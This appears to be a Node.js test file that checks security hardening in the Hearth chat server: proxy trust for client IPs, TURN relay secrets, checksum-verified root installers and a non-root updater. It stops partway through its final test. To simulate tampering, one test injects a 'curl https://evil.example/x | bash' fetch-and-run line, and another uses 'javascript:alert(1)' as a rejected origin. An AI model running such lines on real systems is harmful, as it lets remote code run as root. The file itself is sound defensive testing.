// Infrastructure hardening: who may tell Hearth a visitor's address (TRUST_PROXY), the TURN relay sample, the
// server updater (checksums, no fixed /tmp names, plain installs not coming back as root) and the CI workflows
// (least privilege, pinned actions, locked installs).
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { spawn, spawnSync, execFileSync } = require('node:child_process');
const crypto = require('node:crypto');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const express = require('express');
const { startServer, sleep } = require('./helpers');
const { trustProxySetting, clientIp, ignoredXffHint, netContext } = require('../server/proxytrust');

const ROOT = path.join(__dirname, '..');
const read = (p) => fs.readFileSync(path.join(ROOT, p), 'utf8');
const has = (cmd) => spawnSync('sh', ['-c', `command -v ${cmd}`], { stdio: 'ignore' }).status === 0;
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'hearth-infra-'));

// ------------------------------------------------------------------ TRUST_PROXY (infra-8, platform-1)
// The exact path Express takes for req.ip, with a given TRUST_PROXY value.
function reqIp(setting, remoteAddress, xff) {
  const app = express();
  app.set('trust proxy', trustProxySetting(setting));
  const req = Object.create(app.request);
  req.app = app; req.headers = xff ? { 'x-forwarded-for': xff } : {};
  req.connection = req.socket = { remoteAddress };
  return { ip: req.ip, trust: app.get('trust proxy fn') };
}

test('TRUST_PROXY values: unset = this machine only, numbers are proxy counts, false/true make sense', () => {
  assert.equal(trustProxySetting(undefined), 'loopback');
  assert.equal(trustProxySetting(''), 'loopback');
  assert.equal(trustProxySetting('1'), 1, '"1" is one proxy, not the address 0.0.0.1');
  assert.equal(trustProxySetting('2'), 2);
  assert.equal(trustProxySetting('true'), 1, 'true never means "believe every hop"');
  assert.equal(trustProxySetting('false'), false);
  assert.equal(trustProxySetting('0'), 0);
  assert.equal(trustProxySetting(' 10.0.0.5 ,  fd00::/8 '), '10.0.0.5, fd00::/8');
  // A value Express can't read still fails loudly (the server refuses to start with a clear message).
  assert.throws(() => express().set('trust proxy', trustProxySetting('caddy-container')));
});

test('by default, a visitor arriving from a private address cannot pick its own IP with X-Forwarded-For', () => {
  // Docker's port forwarding (bridge gateway 172.x.0.1), a LAN, link-local and ULA addresses: none are proxies.
  for (const peer of ['172.17.0.1', '172.18.0.1', '192.168.1.20', '10.0.0.1', '169.254.1.1', 'fd00::1', '::ffff:192.168.1.20']) {
    assert.equal(reqIp(undefined, peer, '9.9.9.9').ip, peer, peer);
  }
  // A proxy on the same machine (Caddy/nginx in front of a systemd install) still passes on the real address.
  assert.equal(reqIp(undefined, '127.0.0.1', '9.9.9.9').ip, '9.9.9.9');
  assert.equal(reqIp(undefined, '::1', '9.9.9.9').ip, '9.9.9.9');
  assert.equal(reqIp(undefined, '203.0.113.9', '9.9.9.9').ip, '203.0.113.9');
  // And that's what the server uses (no private-range preset left anywhere).
  const src = read('server/index.js');
  assert.match(src, /app\.set\('trust proxy', trustProxySetting\(process\.env\.TRUST_PROXY\)\)/);
  assert.doesNotMatch(src, /uniquelocal/);
});

test('docker-compose.yml trusts exactly its own Caddy network by default, and .env can name another proxy', () => {
  const compose = read('docker-compose.yml');
  const trust = /^\s+TRUST_PROXY:\s*"\$\{TRUST_PROXY:-([^}"\n]+)\}"\s*$/m.exec(compose);
  assert.ok(trust, 'the hearth service sets TRUST_PROXY, with a default that .env can replace');
  const subnet = /^\s+proxy:\s*\n\s+internal: true\s*\n\s+ipam:\s*\n\s+config:\s*\n\s+- subnet: ([0-9./]+)\s*$/m.exec(compose);
  assert.ok(subnet, 'the internal proxy network has a fixed subnet');
  assert.equal(trust[1].trim(), subnet[1]);
  assert.ok(!/uniquelocal|linklocal/.test(trust[1]));
  // Caddy (somewhere in that subnet) is believed; Docker's port forwarding and the LAN are not.
  const caddy = subnet[1].replace(/\.0\/\d+$/, '.3');
  assert.equal(reqIp(trust[1], caddy, '198.51.100.7').ip, '198.51.100.7');
  assert.equal(reqIp(trust[1], '172.18.0.1', '198.51.100.7').ip, '172.18.0.1');
  assert.equal(reqIp(trust[1], '127.0.0.1', '198.51.100.7').ip, '127.0.0.1');
  // It's a private address, so the plain-HTTP guard lets Caddy through (HTTPS=false behind Caddy).
  assert.match(subnet[1], /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/);
  // .env still reaches Hearth (env_file, and the ${…:-} default above), which is what the server's hint and
  // .env.example tell people to edit.
  assert.match(compose, /env_file:\s*\n\s+- path: \.env/);
  assert.ok(!/^#\s+TRUST_PROXY=1/m.test(compose));
});

// The one-time log line when X-Forwarded-For comes from a proxy that isn't trusted: it has to point at a fix
// that keeps working (a subnet, not a container's changing address) and never at Docker's gateway on its own.
test('the "X-Forwarded-For was ignored" hint names a safe fix, in and out of Docker', () => {
  // Inside Hearth's container (old docker-compose.yml): eth0 = hearth_net (the way out, where published ports
  // arrive; gateway 172.20.0.1), eth1 = the internal "proxy" network with Caddy at 172.19.0.3.
  const docker = {
    inContainer: true, defaultIface: 'eth0', bind: '',
    nets: [{ iface: 'eth0', address: '172.20.0.2', netmask: '255.255.0.0' }, { iface: 'eth1', address: '172.19.0.2', netmask: '255.255.0.0' }],
  };
  // Caddy: the whole internal network, so a recreated Caddy (new address) still counts.
  const caddy = ignoredXffHint('172.19.0.3', docker);
  assert.match(caddy, /set TRUST_PROXY=172\.19\.0\.0\/16 /);
  assert.match(caddy, /docker compose up -d/);
  // ...which fixes the shared address for everyone behind Caddy, without trusting the gateway.
  assert.equal(reqIp(undefined, '172.19.0.3', '198.51.100.1').ip, '172.19.0.3', 'before: everyone is Caddy');
  assert.equal(reqIp('172.19.0.0/16', '172.19.0.3', '198.51.100.1').ip, '198.51.100.1');
  assert.equal(reqIp('172.19.0.0/16', '172.19.0.3', '198.51.100.2').ip, '198.51.100.2');
  assert.equal(reqIp('172.19.0.0/16', '172.20.0.1', '198.51.100.2').ip, '172.20.0.1');
  // Docker's gateway: everyone using the published port comes from it, so never "just trust it"...
  const gw = ignoredXffHint('172.20.0.1', docker);
  assert.match(gw, /Docker's gateway/);
  assert.match(gw, /set both HEARTH_BIND=127\.0\.0\.1 .* and TRUST_PROXY=172\.20\.0\.1/);
  assert.doesNotMatch(gw, /set TRUST_PROXY=172\.20\.0\.1/);
  // ...unless port 3000 only answers on this machine (then it's a proxy on the host, like nginx).
  assert.match(ignoredXffHint('172.20.0.1', { ...docker, bind: '127.0.0.1' }), /set TRUST_PROXY=172\.20\.0\.1 in \.env/);
  // A proxy container on Hearth's outward network: its subnet includes the gateway, so only its own address.
  const traefik = ignoredXffHint('172.20.0.5', docker);
  assert.match(traefik, /set TRUST_PROXY=172\.20\.0\.5 /);
  assert.doesNotMatch(traefik, /172\.20\.0\.0\//);
  assert.match(traefik, /fixed one|internal network/);
  // Without route information, no subnet is suggested at all.
  assert.match(ignoredXffHint('172.19.0.3', { ...docker, defaultIface: '' }), /set TRUST_PROXY=172\.19\.0\.3 /);
  // Not in a container (nginx on another machine): just that address, in .env.
  assert.match(ignoredXffHint('192.168.1.5', { inContainer: false }), /set TRUST_PROXY=192\.168\.1\.5 in \.env and restart Hearth/);
  // The server's own context reader works here.
  const ctx = netContext();
  assert.equal(typeof ctx.inContainer, 'boolean');
  assert.ok(Array.isArray(ctx.nets));
});

test('Socket.IO works out the client address exactly like req.ip', () => {
  const cases = [
    [undefined, '127.0.0.1', '9.9.9.9'], [undefined, '172.18.0.1', '9.9.9.9'], [undefined, '127.0.0.1', '1.1.1.1, 10.0.0.2'],
    [undefined, '127.0.0.1', ''], ['1', '172.18.0.1', '1.1.1.1, 9.9.9.9'], ['2', '172.18.0.1', '1.1.1.1, 9.9.9.9'],
    ['false', '127.0.0.1', '9.9.9.9'], ['10.231.47.0/28', '10.231.47.3', '5.5.5.5'], ['10.231.47.0/28', '10.231.47.3', 'not-an-ip, 5.5.5.5'],
    ['loopback, 10.231.47.0/28', '127.0.0.1', '6.6.6.6, 10.231.47.3'],
  ];
  for (const [setting, peer, xff] of cases) {
    const { ip, trust } = reqIp(setting, peer, xff);
    assert.equal(clientIp(peer, xff, trust), ip, JSON.stringify({ setting, peer, xff }));
  }
});

// Logs in over HTTP and connects over Socket.IO, both claiming `claim` in X-Forwarded-For.
async function claimBoth(srv, u, claim) {
  const http = await srv.login(u, {}, { ip: claim });
  const { io } = require('socket.io-client');
  const s = io(srv.base, { auth: { token: u.token }, transports: ['websocket'], reconnection: false, forceNew: true, extraHeaders: { 'x-forwarded-for': claim } });
  const err = await new Promise((resolve) => { s.once('connect', () => resolve(null)); s.once('connect_error', (e) => resolve(e)); });
  s.close();
  return { httpBanned: !!(http.json && http.json.code === 'ip_banned'), socketRefused: !!err };
}

test('a proxy Hearth does not trust cannot spoof addresses over HTTP or Socket.IO', async () => {
  // Here 127.0.0.1 (where the test connects from) is not a trusted proxy: like a visitor coming through
  // Docker's port forwarding when only Caddy's network is trusted.
  const srv = await startServer({ TRUST_PROXY: '10.231.47.0/28' });
  try {
    const victim = '203.0.113.9';
    const b = await srv.api('POST', '/admin/ip-bans', { token: srv.owner.token, body: { ip: victim, reason: 'test' }, ip: victim });
    assert.equal(b.status, 200, b.text);
    const u = await srv.register(undefined, { ip: victim });
    // Claiming the banned address changes nothing: both see the real 127.0.0.1. (The socket used to take the
    // header from any private address and refuse the connection; now it agrees with HTTP.)
    assert.deepEqual(await claimBoth(srv, u, victim), { httpBanned: false, socketRefused: false });
    assert.equal((srv.log.match(/X-Forwarded-For from 127\.0\.0\.1 was ignored/g) || []).length, 1, 'the operator is told once');
  } finally { await srv.stop(); }
});

test('a trusted proxy still passes on real addresses, to HTTP and Socket.IO alike (IP bans work)', async () => {
  const srv = await startServer(); // default: this machine is the proxy
  try {
    const banned = '203.0.113.10';
    const b = await srv.api('POST', '/admin/ip-bans', { token: srv.owner.token, body: { ip: banned, reason: 'test' }, ip: srv.owner.ip });
    assert.equal(b.status, 200, b.text);
    const u = await srv.register();
    assert.deepEqual(await claimBoth(srv, u, banned), { httpBanned: true, socketRefused: true });
    assert.deepEqual(await claimBoth(srv, u, u.ip), { httpBanned: false, socketRefused: false });
  } finally { await srv.stop(); }
});

test('TRUST_PROXY=1 (the documented setting) gives each visitor behind the proxy their own limits', async () => {
  // It used to mean the address 0.0.0.1, so everyone behind Caddy shared one address and one set of limits.
  const srv = await startServer({ TRUST_PROXY: '1' });
  try {
    for (let i = 0; i < 6; i++) await srv.register(undefined, { ip: `198.51.100.${20 + i}` });
  } finally { await srv.stop(); }
  // "false" turns the header off without crashing the server (it used to: "invalid IP address: false").
  const off = await startServer({ TRUST_PROXY: 'false' });
  try { assert.equal((await off.api('GET', '/config')).status, 200); } finally { await off.stop(); }
});

// ------------------------------------------------------------------ TURN relay sample (infra-5)
test('deploy/turnserver.conf is the locked-down shared-secret setup, never a static password', () => {
  const conf = read('deploy/turnserver.conf');
  const lines = conf.split('\n').map((l) => l.trim()).filter((l) => l && !l.startsWith('#'));
  assert.ok(lines.includes('use-auth-secret'));
  // No working secret until the operator sets one: a copied-but-unedited file must not run with a published
  // placeholder anyone could mint relay passwords with (coturn then accepts nobody).
  assert.ok(!lines.some((l) => l.startsWith('static-auth-secret=')), 'no active static-auth-secret in the sample');
  assert.match(conf, /^#static-auth-secret=$/m);
  assert.doesNotMatch(conf, /CHANGE-ME/);
  assert.ok(!lines.some((l) => /^user=|^lt-cred-mech$/.test(l)), 'no fixed user=name:password');
  for (const o of ['no-multicast-peers', 'no-loopback-peers', 'no-tcp-relay', 'no-cli']) assert.ok(lines.includes(o), o);
  for (const r of ['10.0.0.0', '172.16.0.0', '192.168.0.0', '169.254.0.0', '127.0.0.0', '100.64.0.0', 'fc00::', 'fe80::']) {
    assert.ok(lines.some((l) => l.startsWith(`denied-peer-ip=${r}`)), r);
  }
  // Same block list as the script that sets relays up for real.
  const script = read('scripts/setup-turn.sh');
  for (const l of script.split('\n').filter((x) => x.startsWith('denied-peer-ip='))) assert.ok(lines.includes(l.trim()), l);
  const env = read('.env.example');
  assert.match(env, /^# TURN_SECRET=/m);
  assert.doesNotMatch(env, /TURN_CREDENTIAL=change-me/);
});

test('static TURN credentials still work but the server warns about them', async () => {
  const srv = await startServer({ TURN_URL: 'turn:203.0.113.7:3478', TURN_USERNAME: 'hearth', TURN_CREDENTIAL: 'pw', TURN_SECRET: '' });
  try {
    assert.match(srv.log, /TURN_USERNAME\/TURN_CREDENTIAL hand everyone the same relay password/);
    const u = await srv.register();
    const ice = (await srv.api('GET', '/ice', { token: u.token, ip: u.ip })).json;
    assert.ok(ice.some((x) => x.username === 'hearth'), 'existing setups keep working');
  } finally { await srv.stop(); }
  const srv2 = await startServer({ TURN_URL: 'turn:203.0.113.7:3478', TURN_SECRET: 's'.repeat(32) });
  try {
    assert.doesNotMatch(srv2.log, /TURN_USERNAME/);
    const u = await srv2.register();
    const turn = (await srv2.api('GET', '/ice', { token: u.token, ip: u.ip })).json.find((x) => [].concat(x.urls).some((s) => s.startsWith('turn:')));
    assert.match(turn.username, /^\d+:/, 'time-limited');
  } finally { await srv2.stop(); }
});

// ------------------------------------------------------------------ fixed /tmp names in root scripts (infra-11)
test('nothing run as root writes to a fixed name in /tmp', async () => {
  const code = (p) => read(p).split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  for (const p of ['scripts/hearth-update.sh', 'scripts/harden-vps.sh', 'scripts/setup-turn.sh', 'server/regions.js']) {
    assert.doesNotMatch(code(p), /\/tmp\/hearth-/, p);
  }
  // The region installer (run as root on a fresh VPS) writes its helper into a mktemp folder.
  const srv = await startServer();
  try {
    const add = await srv.api('POST', '/admin/regions', { token: srv.owner.token, ip: srv.owner.ip, body: { name: 'Test', origin: 'https://chat.example.test', authKey: srv.owner.authKey } });
    assert.equal(add.status, 200, add.text);
    const token = add.json.command.match(/k=([0-9a-f]+)/)[1];
    const script = await (await fetch(`${srv.base}/regions/install/${add.json.region.id}?k=${token}`)).text();
    assert.match(script, /SETUP_DIR="\$\(mktemp -d\)"/);
    assert.match(script, /bash "\$SETUP_DIR\/setup-turn\.sh" --relay-only/);
    assert.doesNotMatch(script, /\/tmp\/hearth-/);
    if (has('bash')) assert.equal(spawnSync('bash', ['-n'], { input: script }).status, 0, 'the script parses');
  } finally { await srv.stop(); }
});

// ------------------------------------------------------------------ region installer and relay secret (code-4, code-5)
test('a region install command only fetches over https, checks the download\'s SHA-256 and runs nothing that doesn\'t match', { skip: !['bash', 'sha256sum', 'mktemp'].every(has) && 'needs bash, sha256sum and mktemp' }, async () => {
  const srv = await startServer();
  const t = tmp();
  try {
    const add = (origin) => srv.api('POST', '/admin/regions', { token: srv.owner.token, ip: srv.owner.ip, body: { name: 'Test', origin, authKey: srv.owner.authKey } });
    // The installer runs as root and carries the relay secret: never from a plain http address on the network.
    for (const origin of ['http://chat.example.test', 'http://203.0.113.5:3000', 'ftp://chat.example.test', 'javascript:alert(1)']) {
      const r = await add(origin);
      assert.equal(r.status, 400, origin);
    }
    assert.match((await add('http://chat.example.test')).json.error, /https/);
    const ok = await add('https://chat.example.test');
    assert.equal(ok.status, 200, ok.text);
    const { command } = ok.json;
    const { id } = ok.json.region;
    const token = /[?&]k=([0-9a-f]+)/.exec(command)[1];
    assert.match(command, /^f="\$\(mktemp\)" && curl -fsSL --proto '=https' /);
    assert.ok(command.includes(` -o "$f" 'https://chat.example.test/regions/install/${id}?k=${token}' && `), command);
    assert.doesNotMatch(command, /\|\s*(sudo\s+)?(ba)?sh\b/, 'never piped straight into a shell');
    const script = await (await fetch(`${srv.base}/regions/install/${id}?k=${token}`)).text();
    const sum = crypto.createHash('sha256').update(script).digest('hex');
    assert.ok(command.includes(`echo '${sum}  '"$f" | sha256sum -c - && sudo bash "$f"; rm -f "$f"`), 'the command carries the SHA-256 of exactly what is served');
    // The relay secret reaches setup-turn.sh in a root-only file, not on its command line.
    assert.match(script, /\( umask 077 && printf '%s\\n' '[^'\n]+' > "\$SETUP_DIR\/turn-secret" \)\n/);
    assert.match(script, /bash "\$SETUP_DIR\/setup-turn\.sh" --relay-only --managed --secret-file "\$SETUP_DIR\/turn-secret"\n/);
    assert.doesNotMatch(script, /--secret '/);
    // Renaming the region afterwards doesn't change what's served (its name isn't in the script).
    assert.equal((await srv.api('PATCH', `/admin/regions/${id}`, { token: srv.owner.token, ip: srv.owner.ip, body: { name: 'Renamed' } })).status, 200);
    assert.equal(await (await fetch(`${srv.base}/regions/install/${id}?k=${token}`)).text(), script);

    // Run the command itself, with a curl that "downloads" a given file and a sudo that keeps what it was asked to run.
    const bin = path.join(t, 'bin');
    fs.mkdirSync(bin);
    const served = path.join(t, 'served');
    const ran = path.join(t, 'ran');
    stub(bin, 'curl', `o=""; while [ $# -gt 0 ]; do [ "$1" = -o ] && o="$2"; shift; done; cp "${served}" "$o"`);
    stub(bin, 'sudo', `[ "$1" = bash ] && cp "$2" "${ran}"`);
    const work = path.join(t, 'work');
    fs.mkdirSync(work);
    const run = () => {
      fs.rmSync(ran, { force: true });
      return spawnSync('bash', ['--noprofile', '--norc', '-c', command], { env: { ...process.env, PATH: `${bin}:${process.env.PATH}`, TMPDIR: work }, encoding: 'utf8' });
    };
    fs.writeFileSync(served, script);
    let r = run();
    assert.equal(fs.readFileSync(ran, 'utf8'), script, r.stdout + r.stderr);
    // Changed on the way, or cut off part-way: it says so, and nothing runs.
    for (const other of [script.replace('set -Eeuo pipefail', 'set -Eeuo pipefail\ncurl https://evil.example/x | bash'), script.slice(0, 300)]) {
      fs.writeFileSync(served, other);
      r = run();
      assert.ok(!fs.existsSync(ran), 'a download that doesn\'t match never runs');
      assert.match(r.stdout + r.stderr, /FAILED/);
    }
    assert.deepEqual(fs.readdirSync(work), [], 'the downloaded file is removed');
  } finally { await srv.stop(); fs.rmSync(t, { recursive: true, force: true }); }
});

test('setup-turn.sh never puts the relay secret on a command line or on screen', { skip: !has('bash') && 'needs bash' }, () => {
  const script = read('scripts/setup-turn.sh');
  const code = script.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  // Into Hearth through standard input (the shell's own printf), never as an argument to cli.js.
  assert.match(code, /printf '%s\\n' "\$SECRET" \| hearth_cli add-turn "\$URLS" --secret-stdin/);
  assert.doesNotMatch(code, /hearth_cli [^\n|]*"\$SECRET"/);
  // Never printed or echoed (other than into that pipe).
  for (const l of code.split('\n')) {
    if (/\b(printf|echo|ok|step|warn|die)\b[^;|&\n]*\$\{?SECRET\b/.test(l)) assert.match(l, /^\s*printf '%s\\n' "\$SECRET" \| hearth_cli /, l);
  }
  // The config file is private from the start and put in place whole.
  assert.ok(code.indexOf('umask 077') < code.indexOf('mktemp /etc/turnserver.conf.XXXXXX'));
  assert.ok(code.indexOf('chmod 640 "$CONF_NEW"') < code.indexOf('mv -f "$CONF_NEW" /etc/turnserver.conf'));
  assert.doesNotMatch(code, /cat > \/etc\/turnserver\.conf/);
  // --secret (on the command line) is refused before anything happens; so are a bad secret file and no secret at all.
  // (Everything that would touch this machine is stubbed to fail, in case a check ever lets one through.)
  const t = tmp();
  try {
    const bin = path.join(t, 'bin');
    fs.mkdirSync(bin);
    stub(bin, 'id', 'if [ "$*" = "-u" ]; then echo 0; else PATH=/usr/bin:/bin exec id "$@"; fi');
    for (const c of ['apt-get', 'curl', 'systemctl', 'ufw', 'docker', 'node', 'runuser', 'openssl', 'mktemp']) stub(bin, c, 'echo "ran $0" >&2; exit 1');
    const run = (args) => spawnSync('bash', [path.join(ROOT, 'scripts/setup-turn.sh'), ...args], { env: { ...process.env, PATH: `${bin}:${process.env.PATH}` }, encoding: 'utf8', input: '' });
    let r = run(['--relay-only', '--secret', 'S3CRET-VALUE-123']);
    assert.equal(r.status, 1);
    assert.match(r.stderr, /--secret-file/);
    assert.doesNotMatch(r.stdout + r.stderr, /S3CRET-VALUE-123|ran /);
    assert.equal(run(['--relay-only', '--secret=S3CRET-VALUE-123']).status, 1);
    const f = path.join(t, 'secret');
    fs.writeFileSync(f, 'abc\u0001def\n', { mode: 0o600 });
    r = run(['--relay-only', '--secret-file', f]);
    assert.equal(r.status, 1);
    assert.match(r.stderr, /control character/);
    fs.writeFileSync(f, '');
    assert.match(run(['--relay-only', '--secret-file', f]).stderr, /is empty/);
    r = run(['--relay-only']); // not a terminal: nobody to ask
    assert.equal(r.status, 1);
    assert.match(r.stderr, /needs the main server's relay secret/);
    assert.doesNotMatch(r.stdout + r.stderr, /ran /);
  } finally { fs.rmSync(t, { recursive: true, force: true }); }
});

test('cli.js takes the relay secret from standard input', () => {
  const dir = tmp();
  try {
    const cli = (args, input = '') => spawnSync(process.execPath, ['server/cli.js', ...args], { cwd: ROOT, env: { ...process.env, DATA_DIR: dir }, input, encoding: 'utf8' });
    let r = cli(['add-turn', 'turn:203.0.113.7:3478?transport=udp', '--secret-stdin'], 'from-stdin-1\n');
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.equal(cli(['get-turn-secret']).stdout.trim(), 'from-stdin-1');
    r = cli(['set-turn', 'turn:203.0.113.8:3478?transport=udp', '--secret-stdin'], 'from-stdin-2\r\nignored\n');
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.equal(cli(['get-turn-secret']).stdout.trim(), 'from-stdin-2', 'only the first line, without its line break');
    assert.notEqual(cli(['set-turn', 'turn:203.0.113.8:3478?transport=udp', '--secret-stdin'], '\n').status, 0, 'an empty secret is refused');
    assert.equal(cli(['get-turn-secret']).stdout.trim(), 'from-stdin-2');
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

// ------------------------------------------------------------------ hearth-update.sh (infra-4, infra-11, admin-11)
const stub = (dir, name, body) => { fs.writeFileSync(path.join(dir, name), `#!/bin/bash\n${body}\n`, { mode: 0o755 }); };
const shellReady = () => ['bash', 'zip', 'unzip', 'rsync', 'sha256sum', 'tar', 'flock'].every(has);

// A fake install and an update zip for it, with stubs for everything that would touch the real system (id says
// root; stat says who owns data/, the program folder and a running process; node, npm, curl and docker only
// write to a log). docker: true makes it a Docker install (an older docker-compose.yml unless `compose` says).
// proc: the owner of a look-alike "node server/index.js" process running in the folder (a real process).
function updateLab({ owner = 'alice', progOwner = owner, proc = '', newLock = false, docker = false, compose, env: dotenv, caddy = true, oldTrust = true } = {}) {
  // The stubs make the script believe it's root, so first make sure it keeps everything in the scratch folder
  // (a version without these settings would write to /root, /etc and /usr/local/bin).
  const text = read('scripts/hearth-update.sh');
  for (const v of ['HEARTH_BACKUP_ROOT', 'HEARTH_UPDATE_CONF', 'HEARTH_UPDATE_BIN', 'HEARTH_UPDATE_LOCK', 'HEARTH_UPDATE_PUBKEY']) assert.ok(text.includes(`\${${v}:-`), `hearth-update.sh honours ${v}`);
  const t = tmp();
  const app = path.join(t, 'app');
  for (const d of ['server', 'data', 'node_modules']) fs.mkdirSync(path.join(app, d), { recursive: true });
  fs.writeFileSync(path.join(app, 'server/index.js'), '// old\n');
  if (!oldTrust) fs.writeFileSync(path.join(app, 'server/proxytrust.js'), '// already the new rule\n');
  fs.writeFileSync(path.join(app, 'package.json'), '{\n  "version": "1.0.0"\n}\n');
  fs.writeFileSync(path.join(app, 'package-lock.json'), '{"lock":1}\n');
  fs.writeFileSync(path.join(app, 'data/hearth.db'), '');
  if (dotenv != null) fs.writeFileSync(path.join(app, '.env'), dotenv);
  if (docker) {
    fs.writeFileSync(path.join(app, 'docker-compose.yml'), compose || [
      'services:', '  hearth:', '    build: .', '    env_file:', '      - path: .env', '        required: false',
      '    environment:', '      DATA_DIR: /data', '      # HTTPS: "false"', '      # TRUST_PROXY: "1"', '',
    ].join('\n'));
  }
  // Older than the update's files (rsync skips files whose size and time match).
  for (const f of ['server/index.js', 'package.json']) fs.utimesSync(path.join(app, f), new Date('2020-01-01'), new Date('2020-01-01'));
  const src = path.join(t, 'src', 'hearth');
  for (const d of ['server', 'scripts']) fs.mkdirSync(path.join(src, d), { recursive: true });
  fs.writeFileSync(path.join(src, 'server/index.js'), '// new\n');
  fs.copyFileSync(path.join(ROOT, 'server/proxytrust.js'), path.join(src, 'server/proxytrust.js'));
  fs.writeFileSync(path.join(src, 'package.json'), '{\n  "version": "1.0.1"\n}\n');
  fs.writeFileSync(path.join(src, 'package-lock.json'), newLock ? '{"lock":2}\n' : '{"lock":1}\n');
  fs.copyFileSync(path.join(ROOT, 'scripts/hearth-update.sh'), path.join(src, 'scripts/hearth-update.sh'));
  const zip = path.join(t, 'update.zip');
  execFileSync('zip', ['-qr', zip, 'hearth'], { cwd: path.join(t, 'src') });
  const bin = path.join(t, 'bin');
  fs.mkdirSync(bin);
  const calls = path.join(t, 'calls.log');
  const pids = path.join(t, 'pids');
  const log = `>> "${calls}"`;
  stub(bin, 'id', `if [ "$*" = "-u" ]; then echo 0; else PATH=/usr/bin:/bin exec id "$@"; fi`);
  stub(bin, 'stat', `if [ "$1" = -c ] && [ "$2" = %U ]; then case "$3" in .) echo "${progOwner}" ;; /proc/*) echo "${proc}" ;; *) echo "${owner}" ;; esac; else PATH=/usr/bin:/bin exec stat "$@"; fi`);
  stub(bin, 'getent', `[ "$1" = passwd ] && [ -n "$2" ] && [ "$2" != root ] && echo "$2:x:1000:1000::/home/$2:/bin/sh"`);
  stub(bin, 'setpriv', `echo "setpriv $*" ${log}; while [ "$1" != -- ]; do case "$1" in --reuid=*) export STUB_AS="\${1#--reuid=}";; esac; shift; done; shift; exec "$@"`);
  stub(bin, 'runuser', `echo "runuser $*" ${log}; exit 1`);
  stub(bin, 'chown', `echo "chown $*" ${log}`);
  stub(bin, 'node', `echo "node $* as=\${STUB_AS:-root} cwd=$PWD" ${log}`);
  stub(bin, 'npm', `echo "npm $* as=\${STUB_AS:-root}" ${log}; mkdir -p node_modules`);
  stub(bin, 'curl', 'echo \'{"name":"Hearth"}\'');
  stub(bin, 'pgrep', `[ -s "${pids}" ] && cat "${pids}" || exit 1`);
  for (const n of ['docker-compose', 'pm2', 'apt-get', 'systemctl']) stub(bin, n, 'exit 1');
  // Docker: a running "hearth" container on the old compose's networks; its "proxy" network got 172.19.0.0/16.
  stub(bin, 'docker', !docker ? 'exit 1' : `case "$*" in
  "compose version") exit 0 ;;
  "compose ps -a -q hearth"|"compose ps -q hearth") echo cid1 ;;
  "compose --profile domain ps -q caddy") ${caddy ? 'echo caddy1' : 'true'} ;;
  "compose up -d --no-deps --no-build hearth") echo "docker compose up, .env says: $(grep '^TRUST_PROXY=' .env 2>/dev/null)" ${log} ;;
  "compose build hearth"|"compose stop hearth"|"image prune -f") exit 0 ;;
  "inspect -f {{.Image}} cid1") echo sha256:old ;;
  "inspect -f {{.Config.Image}} cid1") echo app-hearth ;;
  "inspect -f "*NetworkSettings*" cid1") printf 'app_hearth_net\\napp_proxy\\n' ;;
  "network inspect -f "*" app_proxy") printf '172.19.0.0/16\\n' ;;
  *) exit 1 ;;
esac`);
  // A look-alike Hearth in the install folder: a process called "node" running "node server/index.js" there.
  let fake = null;
  if (proc) {
    const fakeNode = path.join(t, 'fake', 'node');
    fs.mkdirSync(path.dirname(fakeNode));
    fs.writeFileSync(fakeNode, '#!/bin/bash\nwhile :; do sleep 0.2; done\n', { mode: 0o755 });
    fake = spawn(fakeNode, ['server/index.js'], { cwd: app, stdio: 'ignore' });
    fs.writeFileSync(pids, `${fake.pid}\n`);
  }
  const env = {
    ...process.env, PATH: `${bin}:${process.env.PATH}`, HEARTH_DIR: app, HEARTH_BACKUP_ROOT: path.join(t, 'backups'),
    HEARTH_UPDATE_CONF: path.join(t, 'conf'), HEARTH_UPDATE_BIN: path.join(t, 'hearth-update'), HEARTH_UPDATE_LOCK: path.join(t, 'lock'),
    HEARTH_UPDATE_PUBKEY: path.join(t, 'hearth-update.pub'),
  };
  const run = (...args) => spawnSync('bash', [path.join(ROOT, 'scripts/hearth-update.sh'), ...args], { env, encoding: 'utf8', timeout: 60000, input: '' });
  const calls_ = () => (fs.existsSync(calls) ? fs.readFileSync(calls, 'utf8') : '');
  // Hearth is started in the background: wait for the stub to say it ran.
  const started = async () => { for (let i = 0; i < 50 && !/^(node |docker compose up)/m.test(calls_()); i++) await sleep(100); return calls_(); };
  const done = () => { if (fake) try { fake.kill('SIGKILL'); } catch { /* already stopped */ } fs.rmSync(t, { recursive: true, force: true }); };
  return { t, app, zip, run, calls: calls_, started, fake, done };
}

test('updating a plain-node install restarts it as its own user, never as root', { skip: !shellReady() && 'needs bash, zip, unzip, rsync' }, async () => {
  const lab = updateLab({ owner: 'alice', newLock: true });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    const calls = await lab.started();
    // Libraries are installed by alice, and Hearth starts as alice (through setpriv, no root parent left).
    assert.match(calls, /^setpriv --reuid=alice --regid=1000 --init-groups -- npm ci/m);
    assert.match(calls, /^npm ci --omit=dev --no-audit --no-fund as=alice$/m);
    assert.match(calls, /^setpriv --reuid=alice --regid=1000 --init-groups -- sh -c exec nohup node server\/index\.js/m);
    assert.match(calls, /^node server\/index\.js as=alice /m);
    assert.doesNotMatch(calls, /as=root/);
    // The new program files stay alice's, and the update really happened.
    assert.match(calls, /^chown -R alice: /m);
    assert.equal(fs.readFileSync(path.join(lab.app, 'server/index.js'), 'utf8'), '// new\n');
  } finally { lab.done(); }
});

test('a plain install that already ran as root is restarted the same way, with a warning', { skip: !shellReady() && 'needs bash, zip, unzip, rsync' }, async () => {
  const lab = updateLab({ owner: 'root' });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /Hearth runs as root/);
    const calls = await lab.started();
    assert.match(calls, /^node server\/index\.js as=root /m);
    assert.doesNotMatch(calls, /setpriv|chown/);
  } finally { lab.done(); }
});

test('hearth-update refuses an update that does not match its .sha256, before changing anything', { skip: !shellReady() && 'needs bash, zip, unzip, rsync' }, async () => {
